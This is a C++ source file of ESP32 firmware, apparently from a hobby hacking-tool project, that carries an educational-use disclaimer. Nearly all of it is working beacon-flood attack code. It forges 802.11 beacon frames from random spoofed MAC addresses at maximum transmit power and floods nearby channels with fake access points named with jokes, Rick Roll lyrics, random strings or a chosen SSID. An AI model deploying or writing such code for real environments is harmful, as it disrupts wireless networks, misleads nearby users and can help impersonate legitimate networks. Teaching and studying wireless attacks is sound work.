/* The developer of this firmware created it for use in their own lectures, workshops, 
and training sessions – all in a controlled environment, with an educational and 
didactic focus, and for the implementation of defensive security.

The developer also makes this firmware available to the entire open-source community, 
cybersecurity professionals, developers, researchers, and anyone else who may find it 
useful, emphasizing its responsible and legal use.

The developer is not responsible for the illegal use of this firmware.
By using this firmware, you agree to use it only for ethical and legal purposes,
respecting the privacy and rights of others, and complying with all applicable laws
and regulations.

WARNING

It is a crime to invade or access someone else's computer device without authorization.

It is a crime to collect or store someone else's data without authorization.

EUA: CFAA (18 U.S.C.§ 1030)
UE: Directive 2013/40/UE
BRA: Law 12.737/2012
PRT: Law 109/2009

*/

#include "wifi_attack.h"
#include "esp_system.h"
#include "esp_random.h"

// Rick Roll SSIDs
const char* RICKROLL_SSIDS[RICKROLL_SSID_COUNT] = {
    "01 Never gonna give you up",
    "02 Never gonna let you down",
    "03 Never gonna run around",
    "04 and desert you",
    "05 Never gonna make you cry",
    "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",
    "08 and hurt you"
};

// Funny SSIDs
const char* FUNNY_SSIDS[] = {
    "SaBOR Energético",
    "Carreta Furacão",
    "Dragon Ball Z",
    "Professor Girafales",
    "Caneta Azul Manoel Gomes",
    "Windows XP inicializando",
    "Android é melhor que iOS",
    "Palmeiras não tem Mundial",
    "Scorpion VS SubZero",
    "Super Mário World",
    "Atirei o pau no gato",
    "Chuck Norris",
    "The BigBang Theory",
    "Superman derrota Goku",
    "Chat do Roblox",
    "Patati Patatá",
    "TekPix câmera digital",
    "Real Madrid campeão",
    "Big Brother Brasil",
    "CrossFit"
};

const int FUNNY_SSIDS_COUNT = sizeof(FUNNY_SSIDS) / sizeof(FUNNY_SSIDS[0]);

// Global instance
WiFiAttackManager wifiAttack;

// Constructor
WiFiAttackManager::WiFiAttackManager() 
    : currentChannel(DEFAULT_CHANNEL), active(false), packetCount(0) {
}

// Destructor
WiFiAttackManager::~WiFiAttackManager() {
    end();
}

// Initialize WiFi for attacks
bool WiFiAttackManager::begin() {
    DEBUG_PRINTLN("[WiFi] Initializing attack mode...");
    
    initWiFi();
    active = true;
    packetCount = 0;
    
    DEBUG_PRINTLN("[WiFi] Attack mode ready");
    return true;
}

// Stop WiFi attacks
void WiFiAttackManager::end() {
    if (!active) return;
    
    DEBUG_PRINTLN("[WiFi] Stopping attack mode...");
    stopWiFi();
    active = false;
    
    DEBUG_PRINTLN("[WiFi] Attack mode stopped");
}

// Initialize WiFi in STA mode for packet injection
void WiFiAttackManager::initWiFi() {
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);
    
    // Set WiFi to promiscuous mode for packet injection
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    
    // Set TX power
    esp_wifi_set_max_tx_power(WIFI_TX_POWER * 4); // Convert to 0.25dBm units
}

// Stop WiFi
void WiFiAttackManager::stopWiFi() {
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_MODE_NULL);
}

// Set WiFi channel
void WiFiAttackManager::setChannel(uint8_t channel) {
    if (channel < MIN_CHANNEL || channel > MAX_CHANNEL) {
        channel = DEFAULT_CHANNEL;
    }
    currentChannel = channel;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    DEBUG_PRINT("[WiFi] Channel set to: ");
    DEBUG_PRINTLN(currentChannel);
}

// Get current channel
uint8_t WiFiAttackManager::getChannel() {
    return currentChannel;
}

// Switch to next channel
void WiFiAttackManager::nextChannel() {
    currentChannel++;
    if (currentChannel > MAX_CHANNEL) {
        currentChannel = MIN_CHANNEL;
    }
    setChannel(currentChannel);
}

// Generate random MAC address
void WiFiAttackManager::generateRandomMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = esp_random() & 0xFF;
    }
    // Set locally administered bit
    mac[0] |= 0x02;
    // Clear multicast bit
    mac[0] &= 0xFE;
}

// Prepare beacon packet
void WiFiAttackManager::prepareBeaconPacket(uint8_t* packet, const uint8_t* mac,
                                           const char* ssid, uint8_t ssidLen,
                                           uint8_t channel) {
    // Clear packet buffer
    memset(packet, 0, BEACON_PKT_LEN);
    
    int pos = 0;
    
    // Frame Control: Type=Management, Subtype=Beacon
    packet[pos++] = 0x80;
    packet[pos++] = 0x00;
    
    // Duration
    packet[pos++] = 0x00;
    packet[pos++] = 0x00;
    
    // Destination address (broadcast)
    for (int i = 0; i < 6; i++) packet[pos++] = 0xFF;
    
    // Source address (random MAC)
    for (int i = 0; i < 6; i++) packet[pos++] = mac[i];
    
    // BSSID (same as source)
    for (int i = 0; i < 6; i++) packet[pos++] = mac[i];
    
    // Sequence control
    packet[pos++] = 0x00;
    packet[pos++] = 0x00;
    
    // Timestamp (8 bytes)
    uint64_t timestamp = esp_timer_get_time();
    memcpy(&packet[pos], &timestamp, 8);
    pos += 8;
    
    // Beacon interval (100 TU = 102.4ms)
    packet[pos++] = 0x64;
    packet[pos++] = 0x00;
    
    // Capability info (ESS)
    packet[pos++] = 0x01;
    packet[pos++] = 0x04;
    
    // SSID parameter set
    packet[pos++] = 0x00; // Tag: SSID
    packet[pos++] = ssidLen; // Length
    memcpy(&packet[pos], ssid, ssidLen);
    pos += ssidLen;
    
    // Supported rates
    packet[pos++] = 0x01; // Tag: Supported Rates
    packet[pos++] = 0x08; // Length
    packet[pos++] = 0x82; // 1 Mbps
    packet[pos++] = 0x84; // 2 Mbps
    packet[pos++] = 0x8B; // 5.5 Mbps
    packet[pos++] = 0x96; // 11 Mbps
    packet[pos++] = 0x0C; // 6 Mbps
    packet[pos++] = 0x12; // 9 Mbps
    packet[pos++] = 0x18; // 12 Mbps
    packet[pos++] = 0x24; // 18 Mbps
    
    // DS Parameter set (channel)
    packet[pos++] = 0x03; // Tag: DS Parameter
    packet[pos++] = 0x01; // Length
    packet[pos++] = channel;
}

// Send beacon packet
bool WiFiAttackManager::sendBeaconPacket(uint8_t* packet, size_t len) {
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
    if (result == ESP_OK) {
        packetCount++;
        return true;
    }
    return false;
}

// Beacon spam with funny SSIDs
void WiFiAttackManager::beaconSpamFunny() {
    DEBUG_PRINTLN("[Beacon] Starting funny SSID spam...");
    
    for (int i = 0; i < FUNNY_SSIDS_COUNT; i++) {
        uint8_t mac[6];
        generateRandomMac(mac);
        
        uint8_t ssidLen = strlen(FUNNY_SSIDS[i]);
        if (ssidLen > MAX_SSID_LENGTH) ssidLen = MAX_SSID_LENGTH;
        
        prepareBeaconPacket(packetBuffer, mac, FUNNY_SSIDS[i], ssidLen, currentChannel);
        
        // Send 2 packets per SSID
        for (int j = 0; j < 2; j++) {
            sendBeaconPacket(packetBuffer, BEACON_PKT_LEN);
            delay(1);
        }
    }
    
    nextChannel();
}

// Beacon spam with random SSIDs
void WiFiAttackManager::beaconSpamRandom() {
    DEBUG_PRINTLN("[Beacon] Starting random SSID spam...");
    
    for (int i = 0; i < BEACON_RATE_LIMIT; i++) {
        uint8_t mac[6];
        generateRandomMac(mac);
        
        // Generate random SSID
        char randomSSID[MAX_SSID_LENGTH + 1];
        uint8_t ssidLen = 8 + (esp_random() % 16); // 8-24 chars
        
        for (int j = 0; j < ssidLen; j++) {
            // Random alphanumeric
            int r = esp_random() % 62;
            if (r < 10) randomSSID[j] = '0' + r;
            else if (r < 36) randomSSID[j] = 'A' + (r - 10);
            else randomSSID[j] = 'a' + (r - 36);
        }
        randomSSID[ssidLen] = '\0';
        
        prepareBeaconPacket(packetBuffer, mac, randomSSID, ssidLen, currentChannel);
        
        // Send 2 packets
        for (int j = 0; j < 2; j++) {
            sendBeaconPacket(packetBuffer, BEACON_PKT_LEN);
            delay(1);
        }
    }
    
    nextChannel();
}

// Beacon spam with Rick Roll SSIDs
void WiFiAttackManager::beaconSpamRickRoll() {
    DEBUG_PRINTLN("[Beacon] Starting Rick Roll spam...");
    
    for (int i = 0; i < RICKROLL_SSID_COUNT; i++) {
        uint8_t mac[6];
        generateRandomMac(mac);
        
        uint8_t ssidLen = strlen(RICKROLL_SSIDS[i]);
        if (ssidLen > MAX_SSID_LENGTH) ssidLen = MAX_SSID_LENGTH;
        
        prepareBeaconPacket(packetBuffer, mac, RICKROLL_SSIDS[i], ssidLen, currentChannel);
        
        // Send 3 packets per SSID for better visibility
        for (int j = 0; j < 3; j++) {
            sendBeaconPacket(packetBuffer, BEACON_PKT_LEN);
            delay(1);
        }
    }
    
    nextChannel();
}

// Beacon spam with custom SSID
void WiFiAttackManager::beaconSpamCustom(const char* ssid) {
    DEBUG_PRINT("[Beacon] Starting custom SSID spam: ");
    DEBUG_PRINTLN(ssid);
    
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > MAX_SSID_LENGTH) ssidLen = MAX_SSID_LENGTH;
    
    for (int i = 0; i < BEACON_RATE_LIMIT; i++) {
        uint8_t mac[6];
        generateRandomMac(mac);
        
        // Add counter to SSID
        char customSSID[MAX_SSID_LENGTH + 1];
        snprintf(customSSID, MAX_SSID_LENGTH, "%s %d", ssid, i + 1);
        uint8_t customLen = strlen(customSSID);
        
        prepareBeaconPacket(packetBuffer, mac, customSSID, customLen, currentChannel);
        
        // Send 2 packets
        for (int j = 0; j < 2; j++) {
            sendBeaconPacket(packetBuffer, BEACON_PKT_LEN);
            delay(1);
        }
    }
    
    nextChannel();
}

// Check if attack is active
bool WiFiAttackManager::isActive() {
    return active;
}

// Get packet count
uint32_t WiFiAttackManager::getPacketCount() {
    return packetCount;
}

// Reset packet count
void WiFiAttackManager::resetPacketCount() {
    packetCount = 0;
}
